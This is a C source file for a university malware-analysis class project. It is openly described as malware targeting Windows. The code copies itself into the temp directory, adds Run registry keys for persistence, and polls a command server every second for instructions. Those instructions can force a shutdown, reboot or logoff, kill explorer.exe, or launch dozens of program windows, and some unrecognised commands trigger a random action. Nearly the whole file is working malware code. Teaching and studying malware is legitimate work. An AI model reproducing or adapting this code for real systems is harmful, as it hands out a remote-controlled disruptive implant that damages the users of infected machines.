/* -------------------------------------------------------------------
 * malwareEjemplo.c
 * version 1.0
 * Copyright (C) 2016  Jose Ricardo Rodriguez Abreu.
 * Facultad de Ciencias,
 * Universidad Nacional Autonoma de Mexico, Mexico.
 *
 * Este programa es software libre; se puede redistribuir
 * y/o modificar en los terminos establecidos por la
 * Licencia Publica General de GNU tal como fue publicada
 * por la Free Software Foundation en la version 2 o
 * superior.
 *
 * Este programa es distribuido con la esperanza de que
 * resulte de utilidad, pero SIN GARANTIA ALGUNA; de hecho
 * sin la garantia implicita de COMERCIALIZACION o
 * ADECUACION PARA PROPOSITOS PARTICULARES. Vease la
 * Licencia Publica General de GNU para mayores detalles.
 *
 * Con este programa se debe haber recibido una copia de la
 * Licencia Publica General de GNU, de no ser asi, visite el
 * siguiente URL:
 * http://www.gnu.org/licenses/gpl.html
 * o escriba a la Free Software Foundation Inc.,
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * -------------------------------------------------------------------
 */

/**
 * @file malwareEjemplo.c
 * @author Jose Ricardo Rodriguez Abreu
 * @date 18 Sep 2016
 * @brief File containing the first project for the "Malware Analysis"
 * class.
 *
 * Este programa es un malware que intenta duplicarse y generar
 * llamadas al sistema en Windows.
 *
 * @see https://github.com/ricardorodab/malwareEjemplo
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 *
 * Revisamos en que sistema operativo nos encontramos solo
 * si es windows continuamos la ejecucion del programa:
 *
 */
// Windows (32-bit y 64-bit)
#ifdef _WIN32
//#ifdef _WIN64
#define _UNICODE
#include <tchar.h>
#include <windows.h>
#include <wchar.h>
#include <conio.h>
#include <wininet.h>
#include <PowrProf.h>

#define BUFSIZE 1024

/*
 * OJO:
 * BANDERAS DE BIBLIOTECAS PARA COMPILAR:
 * -lWininet
 * -lPowrProf
 */

/**
 * Funcion que nos regresa el nombre del archivo.
 * @param nombre - Generalmente dada por la ruta de el mismo.
 * @return Un apuntador a la memoria del nombre del archivo.
 */
char* getNombre(char* nombre)
{
 //Buscamos el ultimo "\" para saber donde empieza su vedadero nombre.
  char nombre2[MAX_PATH];
  strcpy(nombre2,nombre);
  int i = 0;
  int j = 0;
  int mark = 0;
  while(j == 0){
    if(nombre2[i] == '\\'){
      mark = i;
    }else if(nombre2[i] == '\0'){
      j = 1;
    }
    i++;
  }
  if(mark != 0){ mark++; }
  //Creamos el nombre en otro arreglo.
  char vddNombre[MAX_PATH];
  for(j = mark; j < i; j++){
    vddNombre[j-mark] = nombre2[j];
  }
  // Todo lo anterior fue para obtener el verdadero nombre.
  // Ahora solo queda guardar en memoria y hacer el return.
  char *ret = (char*) malloc(sizeof(char) * MAX_PATH);
  strcpy(ret,vddNombre);
  return ret;
}


/**
 * Funcion que gana permisos para apagar y reiniciar la computadora.
 * @param casos - Son los casos como Apagar, reiniciar y suspender.
 * @return 1 si tuvo exito, 0 caso contrario.
 */
int mySystemShutdown(int casos)
{
   HANDLE hToken; 
   TOKEN_PRIVILEGES tkp; 
   // Get a token for this process. 
   if (!OpenProcessToken(GetCurrentProcess(), 
			 TOKEN_ADJUST_PRIVILEGES
			 | TOKEN_QUERY, &hToken)) 
     return( 0 ); 
   // Get the LUID for the shutdown privilege.    
   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
			&tkp.Privileges[0].Luid); 
   
   tkp.PrivilegeCount = 1;  // one privilege to set    
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
   
   // Get the shutdown privilege for this process. 
   
   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, 
			 (PTOKEN_PRIVILEGES)NULL, 0); 
   
   if (GetLastError() != ERROR_SUCCESS) 
     return 0; 
   
   // Shut down the system and force all applications to close. 
   if(casos == 1)
     {
       if (!ExitWindowsEx(EWX_SHUTDOWN, EWX_FORCE)) 
	 return 0; 
     }
   else if (casos == 2)
     {
       if (!ExitWindowsEx(EWX_REBOOT, EWX_FORCE)) 
	 return 0; 
     }
   else if (casos == 3)
     {
       if (!SetSuspendState(TRUE,TRUE,TRUE)) 
	 return 0; 
     }
   else
     {
       if(!ExitWindowsEx(EWX_LOGOFF, EWX_FORCE))
	 return 0;
     }
   //shutdown was successful
   return 1;
}

/**
 * Funcion que ejecuta un programa exe o un comando.
 * @param nombre - Es el nombre del archivo o el comando.
 */
void ejecutarPrograma(int casos)
{
  char* nombre;
  if(casos == 1)
    {
      nombre = "C:\\Windows\\System32\\calc.exe";
    }else
    {
      nombre = "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\"";
  }
  char tmp[MAX_PATH];
  strcpy(tmp,nombre);
  // Magia negra (pte 2) para ejecutar mas cosas:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  // Funcion que tome de ejemplo. Original en:
  //  https://goo.gl/8YYFym
  CreateProcess(NULL,   // No module name (use command line)
		tmp,    // Command line
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		0,      // No creation flags
		NULL,   // Use parent's environment block
		NULL,// Use parent's starting directory
		&si,    // Pointer to STARTUPINFO structure
		&pi );  // Pointer to PROCESS_INFORMATION structure
}

/**
 * Funcion que mata el proceso Explorer.exe
 * @return 1 si tuvo exito, 0 caso contrario.
 */
int killExplorer(void)
{
  char* strCmd1_KillExplorer = "taskkill /f /im explorer.exe";
  PROCESS_INFORMATION pi;
  STARTUPINFO si;
  int bCmd = 1;
  char szCmdTmp[MAX_PATH];
  strcpy(szCmdTmp, strCmd1_KillExplorer);
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  if (CreateProcess(NULL,
		    szCmdTmp,
		    NULL,
		    NULL,
		    FALSE,
		    CREATE_NO_WINDOW,
		    NULL,
		    NULL,
		    &si,
		    &pi)) {
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD dwCode = 0;
    if (!GetExitCodeProcess(pi.hProcess, &dwCode))
      bCmd = 0;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
  }
  else {
    bCmd = 0;
  }
  return bCmd;
}   // killExplorer()

/**
 * Funcion para llamar a las funciones que realizan acciones maliciosas.
 * @param casos - Del 1 al 7 para saber que accion realizar.
 */
void casoMalicioso(int caso)
{
  int i;
  switch(caso)
    {
    case 1:
      //Apagar:
      mySystemShutdown(1);
      break;
    case 2:
      //Reiniciar:
      mySystemShutdown(2);
    case 3:
      //Suspender:
      mySystemShutdown(3);
    case 4:
      //LogOut
      mySystemShutdown(4);
      break;
    case 5:
      //Abrir la calculadora
      for(i = 0; i < 20; i++){
	ejecutarPrograma(1);
      }
      break;
    case 6:
      //Kill explorer.exe
      killExplorer();      
      break;
    case 7:
      //Ejecutrar iExplorer
      for(i = 0; i < 20; i++){
	ejecutarPrograma(2);
      }
      break;
    case 1729:
      //Caso especial para que no haga nada:
      exit(0);
      break;
    default:
      srand(time(NULL));
      int linea = (rand()%7)+1;
      casoMalicioso(linea);      
    }
}


/**
 * Consigue parsear la instruccion que se ejecutara y la ejecuta.
 * @param accion - Es la accion a ejecutar..
 */
void ejecutaAccion(char* accion)
{  
  char txt[MAX_PATH];
  strcpy(txt,accion);
  int i;
  for(i = 0; i < strlen(txt); i++){
    if(txt[i] == '\n')
      {
	txt[i] = '\0';
      }       
  }
  char* uno = "APAGAR";
  char* dos = "REINICIAR";
  char* tres = "SUSPENDER";
  char* cuatro = "CERRAR SESION";
  char* cinco = "CALCULADORA";
  char* seis = "EXPLORER";
  char* siete = "IEXPLORER";
  char* especial = "RODAB";
  
  int ind, linea;
  if(!strcmp(txt,uno) || !strcmp(txt,"1")){
    linea = 1;
  }else if(!strcmp(txt,dos) || !strcmp(txt,"2")){
    linea = 2;
  }else if(!strcmp(txt,tres) || !strcmp(txt,"3")){
    linea = 3;
  }else if(!strcmp(txt,cuatro) || !strcmp(txt,"4")){
    linea = 4;
  }else if(!strcmp(txt,cinco) || !strcmp(txt,"5")){
    linea = 5;
  }else if(!strcmp(txt,seis) || !strcmp(txt,"6")){
    linea = 6;
  }else if(!strcmp(txt,siete) || !strcmp(txt,"7")){
    linea = 7;
  }else if(!strcmp(txt,especial) || !strcmp(txt,"1729")){
    linea = 1729;
  }else{  
      srand(time(NULL));
      linea = (rand()%10)+1;
    }
  casoMalicioso(linea);
}

/**
 * Funcion que se conecta a interner mediante el protocolo HTTP.
 * El nombre de la funcion se le atribuye a el nombre de ejecucion
 * de todos los Jedi atraves de la galaxia.
 *
 * Se conecta al servidor proyecto1.asm.mx y busca el archivo
 * llamado comando.txt que contiene indicaciones del 1 al 10.
 *
 * @return Un apuntador al espacio de memoria en el que se encuentra la lectura del archivo.
 * @see http://blog.differentpla.net/blog/2004/02/26/downloading-from-an-http-server-using-wininet
 */
char* order66(void)
{
  // The first thing that the application
  // needs to do is to initialise WinInet for use by that application
  char lpszAgent[MAX_PATH] = "WinInetGet/0.1";
  HANDLE hInternet ;
  hInternet = InternetOpen(lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

  // Having initialised the WinInet functions,
  // the next thing we do is connect to a particular server:
  char lpszServerName[MAX_PATH] = "proyecto1.asm.mx";
  INTERNET_PORT nServerPort = INTERNET_DEFAULT_HTTP_PORT;
  HINTERNET hConnect = InternetConnect(hInternet,
				       lpszServerName,
				       nServerPort,
				       NULL,
				       NULL,
				       INTERNET_SERVICE_HTTP,
				       0,
				       0);
  // The application then needs to form an HTTP request.
  // This is done with the HttpOpenRequest function:
  char lpszVerb[MAX_PATH] = "GET";
  char lpszObjectName[MAX_PATH] = "/comando.txt"; //"/"
  DWORD dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
    INTERNET_FLAG_KEEP_CONNECTION |
    INTERNET_FLAG_NO_AUTH |
    INTERNET_FLAG_NO_AUTO_REDIRECT |
    INTERNET_FLAG_NO_COOKIES |
    INTERNET_FLAG_NO_UI |
    INTERNET_FLAG_RELOAD;
  //DWORD dwOpenRequestContext = 0;
  HINTERNET hRequest = HttpOpenRequest(hConnect,
				       lpszVerb,
				       lpszObjectName,
				       NULL,
				       NULL,
				       NULL,
				       dwOpenRequestFlags,
				       0);
  BOOL bResult = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
  
  DWORD dwInfoLevel = HTTP_QUERY_RAW_HEADERS_CRLF;
  DWORD dwInfoBufferLength = 10;
  BYTE *pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+1);
  while (!HttpQueryInfo(hRequest, dwInfoLevel, pInfoBuffer, &dwInfoBufferLength, NULL))
    {
      DWORD dwError = GetLastError();
      if (dwError == ERROR_INSUFFICIENT_BUFFER)
	{
	  free(pInfoBuffer);
	  pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+1);
	}
      else
	{
	  fprintf(stderr, "HttpQueryInfo failed, error = %d (0x%x)\n",
		  GetLastError(), GetLastError());
	  break;
	}
    }
  
  pInfoBuffer[dwInfoBufferLength] = '\0';
  printf("%s", pInfoBuffer);
  free(pInfoBuffer);
  //Leemos el archivo:
  DWORD dwBytesAvailable;
  char *msg = (char*)malloc(MAX_PATH+1);
  while (InternetQueryDataAvailable(hRequest, &dwBytesAvailable, 0, 0))
    {
      BYTE *pMessageBody = (BYTE *)malloc(dwBytesAvailable+1);
      DWORD dwBytesRead;
      BOOL bResult = InternetReadFile(hRequest, pMessageBody,
				      dwBytesAvailable, &dwBytesRead);
      if (!bResult)
	{
	  fprintf(stderr, "InternetReadFile failed, error = %d (0x%x)\n",
		  GetLastError(), GetLastError());
	  break;
	}
      
      if (dwBytesRead == 0)
	break;	// End of File.
      
      pMessageBody[dwBytesRead] = '\0';
      strcpy(msg,pMessageBody);
      printf("ACTIVIDADES MALICIOSAS: %s", msg);
      free(pMessageBody);
    }
  // Nos podriamos detener aqui para ver el trafico
  // Y la peticion HTTP:
  //getch();
  return msg;
}

/**
 * Funcion que crea el registro que lo hace persistente.
 * @param name - Recibe este parametro para que sea robusto.
 * @return cero si no se creo correctamente, uno caso contrario.
 */
int registry_app(char* nombre)
{
  char* name = getNombre(nombre);
  char loc[MAX_PATH];
  char fil[MAX_PATH];
  // Obtenemos de nuevo el directorio de trabajo:
  GetCurrentDirectory(sizeof(loc)-1,loc);
  // Recordando de nuevo que no agrega "\" se lo agregamos.
  strcat(loc,"\\");
  
  // Usaba fil y loc para dos cosas diferentes pero lo cambie.
  // y como estaba corto de tiempo y decidi no arriesgarme lo
  // deje asi como esta para evitar posibles errores.
  // "Y pongale aguacate a mi RAM" - Ricardo, 2016.
  strcpy(fil,loc);
  
  // Concatenamos el nombre de mi archivo con la ruta.
  strcat(fil,name);
  HKEY hKey;
  HKEY hkey1;
  HKEY hKey2;
  //DWORD dw;
  char sk[MAX_PATH]  = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  char sk1[MAX_PATH]  = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  
  RegOpenKeyEx(
	       HKEY_CURRENT_USER,
	       sk1,
	       0,
	       KEY_ALL_ACCESS,
	       &hKey2);
  RegSetValueEx(hKey2,        // subkey handle
		"Proyecto01",// Nombre del registro
	       0,           // must be zero
	       1,           // value type
	       (const BYTE *) fil, // pointer to value data
	       sizeof(fil)); // Nike: Just do it!
 RegCloseKey(hKey2);
 LONG openRes = RegOpenKeyEx(
			     HKEY_LOCAL_MACHINE,
			     sk,
			     0,
			     KEY_ALL_ACCESS,
			     &hKey);
  // Revisamos que hayamos abierto correctamente el registro de llaves.
  if (openRes==ERROR_SUCCESS) {
    LONG createKey = RegSetValueEx(hKey,        // subkey handle
				   "Proyecto01",// Nombre del registro
				   0,           // must be zero
				   1,           // value type
				   (const BYTE *) fil, // pointer to value data
				   sizeof(fil)); // Nike: Just do it!

    // Revisamos que se haya creado correctamente.
    if(createKey == ERROR_SUCCESS)
      {
	/*
	 * Si se crea correctamente regresamos un 1.
	 * printf("Success creating key."); 
	 */
	return 1;	
      }
    // Si no se crea correctamente imprimimos que no se pudo
    // y mandamos un error de aproximacion de la linea de error.
    printf("Error creating key (Aprox linea: %d).",__LINE__);
    return 0;
  } else {
    // Esto se ejecuta al abrir las llaves y tener un error.
    // Si tuvimos error regresamos cero.
    printf("Error opening key (Aprox linea: %d).",__LINE__);
    return 0;
  }
}

/**
 * Funcion que revisa que estemos en el directorio tmp
 * nos regresa el valor de 1 o 0 como booleano.
 *
 * @return 1 si estamos en tmp y 0 caso contrario.
 */
int cmplocation(char* nombre)
{
  char tmp[MAX_PATH];
  char loc[MAX_PATH];
  GetCurrentDirectory(sizeof(loc)-1,loc);
  GetTempPath(sizeof(tmp)-1,tmp);
  // Hacemos esto porque la cadena que nos regresa
  // GetCurrent y GetTemp difieren siempre en que uno
  // termina con "\" y el otro no.
  strcat(loc,"\\");
  char* sy32 = "C:\\Windows\\system32\\";
  int bool = strcmp(tmp,loc);
  int bool2 = strcmp(sy32,loc);
  if(bool == 0 || bool2 == 0)
    {
      // Solo pasa esto si esta en tmp asi que
      // desde aqui invocamos las funciones que queremos
      // que el malware ejecute.
      printf("Desde aqui actua. Linea: %d\n",__LINE__);
      int registroExitoso = registry_app(nombre);
      while(1){
	Sleep(1000);
	char* orden = order66();
	ejecutaAccion(orden);
      }
      return -1;      
    }
  return mueveArchivo(loc,tmp,nombre);
}

/**
 * Esta funcion mueve el archivo desde cualquier lugar
 * hasta la localidad de tmp de Windows.
 * @param origen - Es donde se encuentra actualmente el archivo.
 * @param destino - Es a donde queremos mover (tmp);
 * @return Un 0 si hubo error, 1 en otro caso.
 */
int mueveArchivo(char* origen, char* destino, char* nombre)
{
  char* vddNombre = getNombre(nombre);
  int result;
  strcat(origen,vddNombre);
  strcat(destino,vddNombre);
  printf("Se mueve de %s ---> %s\n",origen,destino);
  result = MoveFileEx(origen,destino,MOVEFILE_WRITE_THROUGH);
  if(result == 0){
    result = MoveFileEx(origen,destino,MOVEFILE_REPLACE_EXISTING);
  }
  return result;
}

/**
 * Funcion que ejecuta un programa exe o un comando.
 * @param nombre - Es el nombre del archivo o el comando.
 */
void ejecutarDeNuevo(char* name)
{
  char* nombre = getNombre(name);
  char tmp[MAX_PATH];
  // El directorio padre del nuevo proceso:
  char tmpPure[MAX_PATH];
  // Volvemos a localizar a %tmp%.
  GetTempPath(sizeof(tmp)-1,tmp);
  strcpy(tmpPure,tmp);
  strcat(tmp,nombre);
  // Magia negra para ejecutar mas cosas:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  // Funcion que tome de ejemplo. Original en:
  //  https://goo.gl/8YYFym
  CreateProcess(NULL,   // No module name (use command line)
		tmp,    // Command line
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		0,      // No creation flags
		NULL,   // Use parent's environment block
		tmpPure,// Use parent's starting directory
		&si,    // Pointer to STARTUPINFO structure
		&pi );  // Pointer to PROCESS_INFORMATION structure
}

/**
 * Es la unica función que llama
 * el main de nuestro malware en Window.
 * @param argc - Es el número de argumentos.
 * @param argv - Nos importa porque contiene el nombre.
 */
void so(int argc, char** argv)
{
  printf("Hola Windows!\n");

  int continuar = cmplocation(argv[0]);
  if(continuar == 0)
    {
      printf("Algo fallo\n");
    }
  else if(continuar == -1)
    {      
      printf("Success!!!\n");
      //getch();
      exit(0);
    }else{
    ejecutarDeNuevo(argv[0]);
  }
  //getch();
  exit(0);
} //Fin de la funcion so de Windows.



// Apple:
#elif __APPLE__
void so(int argc, char** argv)
{
  printf("Hola Apple!\n");  
  exit(0);
}

// Linux:
#elif __linux__
void so(int argc, char** argv)
{
  printf("Hola Linux!\n");
  exit(0);
}

// Unix:
#elif __unix__
void so(int argc, char** argv)
{
  printf("Hola Unix!\n");
  exit(0);
}

// Caso ajeno:
#else
#   error "Unknown compiler"
#endif

/**
 * Funcion principal del programa.
 * @param argc - Es la cantidad de parametros que recibe.
 * @param argv - Son los parametros en cadena. 
 * @return 0 si no hubo ningun error de ejecucion.
 */
int main(int argc, char** argv)
{
  so(argc, argv);
  return 0;
}//Fin de malwareEjemplo.c
